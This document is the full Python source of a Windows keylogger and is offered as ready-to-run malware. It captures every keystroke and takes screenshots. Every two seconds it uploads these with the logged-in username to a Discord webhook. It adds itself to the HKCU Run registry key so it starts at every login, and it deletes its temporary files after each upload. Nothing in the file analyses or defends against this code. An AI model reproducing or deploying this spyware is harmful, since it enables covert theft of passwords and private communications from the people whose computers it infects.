import keyboard
import os
import pyautogui
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
import winreg as reg

SEND_REPORT_EVERY = 2
WEBHOOK = "DISCORD_WEBHOOK_HERE"

class Keylogger:
    def __init__(self, interval, report_method="webhook"):
        now = datetime.now()
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()
        self.screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
        self.add_to_startup()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save(self.screenshot_path)

    def report_to_webhook(self):
        flag = False
        webhook = DiscordWebhook(url=WEBHOOK)

        if len(self.log) > 2000:
            flag = True
            path = os.path.join(os.getenv('TEMP'), 'report.txt')
            with open(path, 'w+') as file:
                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='report.txt')
        else:
            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
            webhook.add_embed(embed)
        
        self.take_screenshot()
        with open(self.screenshot_path, 'rb') as f:
            webhook.add_file(file=f.read(), filename='screenshot.png')

        webhook.execute()
        if flag:
            os.remove(path)
        os.remove(self.screenshot_path)

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def add_to_startup(self):
        # The name of the registry key
        key_name = "MyKeylogger"
        # Full path of the executable
        executable_path = os.path.abspath(__file__)
        # Registry key path
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        # Open the registry key
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_SET_VALUE)
        # Set the value
        reg.SetValueEx(key, key_name, 0, reg.REG_SZ, executable_path)
        # Close the key
        reg.CloseKey(key)

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    try:
        import pyautogui
    except ImportError:
        print("pyautogui is not installed. Please install it by running 'pip install pyautogui'")

    try:
        from PIL import Image
    except ImportError:
        print("Pillow is not installed. Please install it by running 'pip install Pillow'")

    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")
    keylogger.start()
